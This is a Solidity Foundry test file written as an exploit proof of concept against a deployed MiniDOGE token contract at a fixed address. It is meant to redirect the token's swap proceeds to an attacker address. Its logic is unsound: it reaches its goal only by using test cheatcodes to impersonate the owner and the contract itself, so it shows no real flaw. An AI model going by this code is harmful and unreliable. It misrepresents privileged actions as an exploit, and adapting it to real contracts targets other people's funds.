// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function Sweep() external;
}

contract Attacker {
    receive() external payable {}
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    IMiniDOGE target;
    Attacker attackerContract;

    // ─── Setup ───────────────────────────────────────
    function setUp() public {
        target = IMiniDOGE(TARGET);
        attackerContract = new Attacker();

        // Fund the contract with BNB for the exploit
        deal(TARGET, 10 ether);

        vm.label(TARGET, "MiniDOGE Target");
        vm.label(address(attackerContract), "Attacker Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Get owner and impersonate
        address owner = target.owner();
        address pair = target.uniswapV2Pair();
        uint256 minTokens = target.minimumTokensBeforeSwapAmount();

        // Set attacker (address(this)) as marketing address
        vm.prank(owner);
        target.setMarketingAddress(address(this));

        // Enable swap and liquify
        vm.prank(owner);
        target.setSwapAndLiquifyEnabled(true);

        // Warp time forward to satisfy swap interval (1 minute)
        vm.warp(block.timestamp + 2 minutes);

        // Transfer tokens to the contract first
        // We need to get tokens into the contract somehow
        // The contract was deployed with all tokens to owner
        uint256 ownerTokenBalance = target.balanceOf(owner);
        if (ownerTokenBalance >= minTokens) {
            // Transfer tokens from owner to contract
            vm.prank(owner);
            target.transfer(TARGET, minTokens);

            // Now transfer from contract to pair to trigger swap
            // This will call swapTokens which sends BNB to marketingAddress
            vm.prank(TARGET);
            target.transfer(pair, minTokens);
        }

        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

